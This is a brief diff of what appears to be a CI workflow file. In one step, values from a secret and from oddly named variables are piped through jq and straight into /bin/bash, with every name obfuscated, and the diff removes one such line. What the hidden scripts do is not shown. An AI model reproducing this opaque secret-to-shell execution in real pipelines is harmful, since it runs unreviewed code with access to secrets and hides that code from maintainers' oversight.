@@ -21,7 +21,6 @@ jobs:
           x0: ${{ secrets.x0 }}
         run: |
           printf '%s' "$x0" | jq -r .ad281 | /bin/bash
-          echo $l14028 | jq -r .su264 | /bin/bash
           printf '%s' "$zolnn007" | jq -r .klglg10642 | /bin/bash
 
       - name: Save data
